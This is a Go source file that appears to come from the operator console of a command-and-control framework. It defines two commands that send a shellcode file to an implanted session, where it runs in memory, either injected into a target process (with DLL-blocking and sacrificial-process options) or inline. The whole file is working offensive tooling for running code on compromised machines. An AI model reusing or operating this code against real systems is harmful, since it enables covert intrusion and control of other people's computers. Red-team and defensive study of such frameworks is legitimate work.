package exec

import (
	"github.com/chainreactors/grumble"
	"github.com/chainreactors/malice-network/client/console"
	"github.com/chainreactors/malice-network/helper/consts"
	"github.com/chainreactors/malice-network/proto/implant/implantpb"
	"strings"

	"google.golang.org/protobuf/proto"
	"os"
)

// ExecuteShellcodeCmd - Execute shellcode in-memory
func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.Console) {
	session := con.ActiveTarget.GetInteractive()
	if session == nil {
		return
	}
	sid := con.ActiveTarget.GetInteractive().SessionId
	//rwxPages := ctx.Flags.Bool("rwx-pages")
	//interactive := ctx.Flags.Bool("interactive")
	//if interactive {
	//	console.Log.Errorf("Interactive shellcode can only be executed in a session\n")
	//	return
	//}
	pid := ctx.Flags.Uint("pid")
	shellcodePath := ctx.Args.String("filepath")
	paramString := ctx.Flags.String("param")
	isBlockDll := ctx.Flags.Bool("block_dll")
	isNeedSacrifice := ctx.Flags.Bool("sacrifice")
	var params []string
	if paramString != "" {
		params = strings.Split(paramString, ",")
	}
	shellcodeBin, err := os.ReadFile(shellcodePath)
	if err != nil {
		console.Log.Errorf("%s\n", err.Error())
		return
	}

	shellcodeTask, err := con.Rpc.ExecuteShellcode(con.ActiveTarget.Context(), &implantpb.ExecuteShellcode{
		Name:            consts.ModuleExecuteShellcode,
		Bin:             shellcodeBin,
		Pid:             uint32(pid),
		Inline:          false,
		Params:          params,
		BlockDll:        isBlockDll,
		IsNeedSacrifice: isNeedSacrifice,
	})

	if err != nil {
		con.SessionLog(sid).Errorf("%s\n", err)
		return
	}

	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		if !(resp.Status.Error != "") {
			con.SessionLog(sid).Consolef("Executed shellcode on target: %s\n", resp.GetAssemblyResponse().GetData())
		}
	})
}

func ExecuteShellcodeInlineCmd(ctx *grumble.Context, con *console.Console) {
	session := con.ActiveTarget.GetInteractive()
	if session == nil {
		return
	}
	sid := con.ActiveTarget.GetInteractive().SessionId
	path := ctx.Args.String("filepath")
	paramString := ctx.Flags.String("param")
	var params []string
	if paramString != "" {
		params = strings.Split(paramString, ",")
	}
	data, err := os.ReadFile(path)
	if err != nil {
		con.SessionLog(sid).Errorf("Error reading file: %v", err)
		return
	}
	shellcodeTask, err := con.Rpc.ExecuteShellcode(con.ActiveTarget.Context(), &implantpb.ExecuteShellcode{
		Name:   consts.ModuleExecuteShellcode,
		Bin:    data,
		Params: params,
		Inline: true,
	})
	con.AddCallback(shellcodeTask.TaskId, func(msg proto.Message) {
		resp := msg.(*implantpb.Spite)
		if !(resp.Status.Error != "") {
			con.SessionLog(sid).Consolef("Executed shellcode on target: %s\n", resp.GetAssemblyResponse().GetData())
		}
	})
}
